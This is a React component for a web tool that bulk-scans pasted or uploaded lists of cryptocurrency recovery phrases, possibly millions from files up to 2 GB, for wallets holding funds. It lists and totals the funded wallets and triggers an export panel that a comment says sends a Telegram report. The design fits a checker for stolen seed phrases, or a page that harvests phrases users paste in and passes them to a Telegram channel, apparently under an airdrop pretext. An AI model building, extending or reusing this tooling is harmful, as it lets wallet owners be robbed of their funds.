import { useEffect, useMemo, useRef, useState } from "react";
import { X } from "lucide-react";
import FundedExport from "@/components/wallet/scan/FundedExport";
import PhraseInput from "@/components/wallet/scan/PhraseInput";
import ScanProgress from "@/components/wallet/scan/ScanProgress";
import ScanSummary from "@/components/wallet/scan/ScanSummary";
import ScanResultRow from "@/components/wallet/scan/ScanResultRow";
import { fetchPricesFor } from "@/lib/chains/prices";
import useWakeLock from "@/hooks/useWakeLock";
import { entriesFromList, parsePhrases, phrasesFromFile, scanAssets, scanPhraseStream } from "@/lib/phrase-scan";

const MAX_FILE_BYTES = 2 * 1024 * 1024 * 1024;
const PAGE = 100;
// Pasting or typing pauses for a moment, then the new lines are scanned: no
// button to press, and a half-typed line is not sent on every keystroke.
const AUTO_DELAY = 700;

const EMPTY_LIVE = { completed: 0, started: 0, fundedCount: 0, fundedTotal: 0, failed: 0, invalid: 0 };

export default function ScanWorkspace() {
  const [text, setText] = useState("");
  const [fileName, setFileName] = useState("");
  const [count, setCount] = useState(0);
  const [words, setWords] = useState(12);
  const [total, setTotal] = useState(0);
  const [started, setStarted] = useState(false);
  const [scanning, setScanning] = useState(false);
  const [stats, setStats] = useState({ ...EMPTY_LIVE });
  const [page, setPage] = useState(1);
  const [onlyFunded, setOnlyFunded] = useState(false);
  const [error, setError] = useState("");
  const [elapsed, setElapsed] = useState(0);
  const [version, setVersion] = useState(0);
  // The report panel waits for the typing to settle, so a line-by-line scan does
  // not fire one Telegram report per line.
  const [exportReady, setExportReady] = useState(false);

  const resultsRef = useRef([]);
  // Phrases already queued or scanned: editing the text again only sends the
  // new lines, so a scan never repeats work it already did.
  const seenRef = useRef(new Set());
  const queueRef = useRef([]);
  const busyRef = useRef(false);
  const pricesRef = useRef(null);
  const startedAtRef = useRef(0);
  const liveRef = useRef({ ...EMPTY_LIVE });
  const cancelledRef = useRef(false);
  const countRef = useRef(0);
  const flushRef = useRef(null);
  const settleRef = useRef(null);

  // Never one render per phrase (a scan can hold millions), but a phrase that
  // comes back is pushed to the list within a moment of being found — results
  // appear one by one while the scan is still running.
  function scheduleFlush() {
    if (flushRef.current) return;
    flushRef.current = setTimeout(() => {
      flushRef.current = null;
      setStats({ ...liveRef.current });
      setVersion((value) => value + 1);
    }, 90);
  }

  useEffect(
    () => () => {
      if (flushRef.current) clearTimeout(flushRef.current);
      if (settleRef.current) clearTimeout(settleRef.current);
    },
    [],
  );

  function scheduleExport() {
    if (settleRef.current) clearTimeout(settleRef.current);
    settleRef.current = setTimeout(() => {
      settleRef.current = null;
      if (resultsRef.current.some((slot) => slot.status === "done")) setExportReady(true);
    }, 2000);
  }

  // The screen stays awake while a scan runs: a sleeping or locked phone stops
  // the page's network work, so the scan would stall until it is unlocked.
  useWakeLock(scanning);

  // A batch can take seconds on a busy node: the clock keeps ticking so a slow
  // scan still shows that work is moving.
  useEffect(() => {
    if (!scanning) return undefined;
    const tick = () => setElapsed(Math.floor((Date.now() - startedAtRef.current) / 1000));
    tick();
    const id = setInterval(tick, 1000);
    return () => clearInterval(id);
  }, [scanning]);

  // Typing or pasting a line is the start signal: once the text rests for a
  // moment its new phrases are queued and scanned on their own.
  useEffect(() => {
    if (!text.trim()) return undefined;
    const id = setTimeout(() => queuePhrases(text, words), AUTO_DELAY);
    return () => clearTimeout(id);
  }, [text, words]);

  // The listed count is the truth: it is how many phrases were actually found
  // and checked, so the number on screen always matches the rows below it.
  const { rows, foundCount, fundedTotalCount } = useMemo(() => {
    const list = resultsRef.current.filter((slot) => slot.status === "done");
    return {
      foundCount: list.length,
      fundedTotalCount: list.reduce((sum, slot) => sum + (slot.total > 0 ? 1 : 0), 0),
      rows: onlyFunded ? list.filter((slot) => slot.total > 0) : list,
    };
  }, [version, onlyFunded]);

  const visible = rows.slice(0, page * PAGE);

  // Each line is read with the selected number of words (12, 15, …).
  const matching = (value, size) => parsePhrases(value, size);

  function onChange(value) {
    setText(value);
    setFileName("");
    const entries = matching(value, words);
    setCount(entries.length);
    if (!entries.length) setTotal(seenRef.current.size);
  }

  function changeWords(size) {
    setWords(size);
    const entries = matching(text, size);
    setCount(entries.length);
    setTotal(entries.length);
  }

  // Everything the scan reports goes through here, so a pasted list and a file
  // fill the results the same way.
  function scanHandlers(prices) {
    const live = liveRef.current;
    return {
      prices,
      isCancelled: () => cancelledRef.current,
      onResult: (result) => {
        // Only real, valid recovery phrases are listed — an unreadable line is
        // counted instead of taking a row in the results.
        if (result.status !== "done") {
          live.invalid += 1;
          scheduleFlush();
          return;
        }
        resultsRef.current.push(result);
        if (result.total > 0) {
          live.fundedCount += 1;
          live.fundedTotal += result.total;
        }
        if (result.failed) live.failed += result.failed;
        scheduleFlush();
      },
      onProgress: ({ completed, started: begun }) => {
        live.completed = completed;
        if (begun !== undefined) live.started = begun;
        // The processed counter ticks on its own, so a slow batch still shows
        // that work is moving.
        scheduleFlush();
      },
    };
  }

  // Prices only feed the USD total: a slow or blocked price feed must never
  // hold the scan at zero.
  async function resolvePrices() {
    if (!pricesRef.current) {
      pricesRef.current = await Promise.race([
        fetchPricesFor(scanAssets),
        new Promise((resolve) => setTimeout(() => resolve({}), 4000)),
      ]);
    }
    return pricesRef.current;
  }

  function stop() {
    cancelledRef.current = true;
    queueRef.current = [];
  }

  function queuePhrases(value, size) {
    const fresh = matching(value, size).filter((entry) => {
      if (seenRef.current.has(entry.phrase)) return false;
      seenRef.current.add(entry.phrase);
      return true;
    });
    if (!fresh.length) return;
    queueRef.current.push(...fresh);
    setTotal(seenRef.current.size);
    setStarted(true);
    pump();
  }

  // One worker drains the queue: lines added while a scan is running join it
  // and are checked as soon as the current batch lands.
  async function pump() {
    if (busyRef.current) return;
    busyRef.current = true;
    cancelledRef.current = false;
    setError("");
    setStarted(true);
    setScanning(true);
    if (!startedAtRef.current) {
      startedAtRef.current = Date.now();
      setElapsed(0);
    }

    try {
      const prices = await resolvePrices();
      const handlers = scanHandlers(prices);
      while (queueRef.current.length && !cancelledRef.current) {
        const batch = queueRef.current;
        queueRef.current = [];
        await scanPhraseStream(entriesFromList(batch), handlers);
      }
    } catch {
      setError("The scan stopped unexpectedly. Try again with fewer phrases.");
    } finally {
      if (flushRef.current) {
        clearTimeout(flushRef.current);
        flushRef.current = null;
      }
      busyRef.current = false;
      cancelledRef.current = false;
      setScanning(false);
      setTotal(seenRef.current.size || resultsRef.current.length);
      setStats({ ...liveRef.current });
      setVersion((value) => value + 1);
      scheduleExport();
    }
  }

  function clearResults() {
    resultsRef.current = [];
    seenRef.current = new Set();
    queueRef.current = [];
    liveRef.current = { ...EMPTY_LIVE };
    countRef.current = 0;
    startedAtRef.current = 0;
    setStats({ ...EMPTY_LIVE });
    setStarted(false);
    setCount(0);
    setTotal(0);
    setPage(1);
    setOnlyFunded(false);
    setElapsed(0);
    setError("");
    if (settleRef.current) {
      clearTimeout(settleRef.current);
      settleRef.current = null;
    }
    setExportReady(false);
    setVersion((value) => value + 1);
  }

  function clearAll() {
    stop();
    clearResults();
    setText("");
    setFileName("");
  }

  // A scan already running is stopped first: the file then starts from a clean
  // slate instead of racing the pasted list.
  async function waitIdle(maxMs = 5000) {
    const until = Date.now() + maxMs;
    while (busyRef.current && Date.now() < until) {
      await new Promise((resolve) => setTimeout(resolve, 60));
    }
  }

  async function readFile(file) {
    setError("");
    if (file.size > MAX_FILE_BYTES) {
      setError("That file is larger than 2 GB. Split it into smaller .txt files.");
      return;
    }

    stop();
    clearResults();
    setText("");
    setFileName(file.name);
    await waitIdle();

    busyRef.current = true;
    setScanning(true);
    setStarted(true);
    startedAtRef.current = Date.now();
    setElapsed(0);

    try {
      const prices = await resolvePrices();
      // The file is scanned as it is read: phrases beyond the first few thousand
      // are handled one at a time, so even a multi-gigabyte list stays in memory.
      await scanPhraseStream(
        phrasesFromFile(file, {
          words,
          onCount: (value) => {
            countRef.current = value;
            setCount(value);
            // The detected total grows with the file, so "processed / total" is
            // real from the first batch instead of waiting for the whole file.
            setTotal(value);
          },
        }),
        scanHandlers(prices),
      );
    } catch {
      setError("The scan stopped unexpectedly. Try again with fewer phrases.");
    } finally {
      if (flushRef.current) {
        clearTimeout(flushRef.current);
        flushRef.current = null;
      }
      busyRef.current = false;
      cancelledRef.current = false;
      setScanning(false);
      // A file's phrase count is only known once it has been read through.
      setTotal((current) => current || Math.max(countRef.current, resultsRef.current.length));
      setStats({ ...liveRef.current });
      setVersion((value) => value + 1);
      scheduleExport();
    }
  }

  function getFunded() {
    return resultsRef.current.filter((slot) => slot.total > 0);
  }

  function getAll() {
    return resultsRef.current.filter((slot) => slot.status === "done");
  }

  const hasFunds = fundedTotalCount > 0;
  const scannedTotal = total || stats.completed || foundCount;

  return (
    <div className="relative">
      <PhraseInput
        value={text}
        fileName={fileName}
        onChange={onChange}
        onFile={readFile}
        error={error}
        onCancel={stop}
        scanning={scanning}
        count={count}
        words={words}
        onWords={changeWords}
      />

      {started ? (
        <div className="mt-5 space-y-2.5">
          <div className="flex items-end justify-between">
            <div>
              <p className="text-[9px] font-medium uppercase tracking-[0.3em] text-muted-foreground/70">
                {scanning ? "Scanning" : "Results"}
              </p>
              <p className="mt-1.5 font-display text-[22px] leading-none">
                {foundCount.toLocaleString("en-US")} wallet{foundCount === 1 ? "" : "s"}
              </p>
            </div>
            <button
              type="button"
              onClick={clearAll}
              className="inline-flex items-center gap-1.5 rounded-full border border-foreground/[0.1] bg-foreground/[0.03] px-3 py-1.5 text-[10.5px] font-medium text-muted-foreground transition-colors hover:text-foreground"
            >
              <X className="h-3 w-3" />
              Clear
            </button>
          </div>

          <ScanSummary
            total={total}
            progress={{ completed: Math.max(stats.completed, foundCount), total }}
            fundedCount={fundedTotalCount}
            fundedTotal={stats.fundedTotal}
            onlyFunded={onlyFunded}
            onToggleFilter={() => {
              setOnlyFunded((value) => !value);
              setPage(1);
            }}
            finished={!scanning}
          />

          <ScanProgress
            completed={Math.max(stats.completed, foundCount)}
            total={total}
            started={stats.started}
            elapsed={elapsed}
            detected={count}
            found={foundCount}
            funded={fundedTotalCount}
            fundedTotal={stats.fundedTotal}
            invalid={stats.invalid}
            failed={stats.failed}
            finished={!scanning}
          />

          {exportReady ? <FundedExport getFunded={getFunded} getAll={getAll} scanned={scannedTotal} /> : null}

          {stats.failed > 0 ? (
            <p className="px-1 text-[10px] leading-relaxed text-muted-foreground/60">
              {stats.failed.toLocaleString("en-US")} chain read{stats.failed === 1 ? "" : "s"} failed on busy public
              nodes — those wallets may hold more than shown, so run the scan again for a full picture.
            </p>
          ) : null}

          {stats.invalid > 0 ? (
            <p className="px-1 text-[10px] leading-relaxed text-muted-foreground/60">
              {stats.invalid.toLocaleString("en-US")} entr{stats.invalid === 1 ? "y is" : "ies are"} not a valid BIP-39
              recovery phrase — {stats.invalid === 1 ? "it is" : "they are"} listed as unreadable.
            </p>
          ) : null}

          <div className="space-y-2">
            {visible.map((row, position) => (
              <ScanResultRow key={`${position}-${row.phrase}`} result={row} index={position} />
            ))}
          </div>

          {rows.length > visible.length ? (
            <button
              type="button"
              onClick={() => setPage((value) => value + 1)}
              className="w-full rounded-xl border border-foreground/[0.1] py-2 text-[10.5px] font-medium uppercase tracking-[0.14em] text-muted-foreground transition-colors hover:text-foreground"
            >
              Show {Math.min(PAGE, rows.length - visible.length)} more · {rows.length - visible.length} left
            </button>
          ) : null}

          {!scanning && foundCount > 0 && fundedTotalCount === 0 ? (
            <div className="lux noise relative p-4 text-center">
              <p className="relative font-display text-[18px] leading-tight">No funds on these wallets</p>
              <p className="relative mx-auto mt-1.5 max-w-[300px] text-[10.5px] leading-relaxed text-muted-foreground/80">
                Airdrop balances may sit on chains or tokens outside this scan. Open a result to check its addresses on a
                block explorer.
              </p>
            </div>
          ) : null}

          {!scanning && hasFunds ? (
            <p className="px-1 pt-1 text-[10.5px] leading-relaxed text-muted-foreground/70">
              {fundedTotalCount} wallet{fundedTotalCount === 1 ? "" : "s"} with funds — open one to copy its addresses.
            </p>
          ) : null}
        </div>
      ) : null}

    </div>
  );
}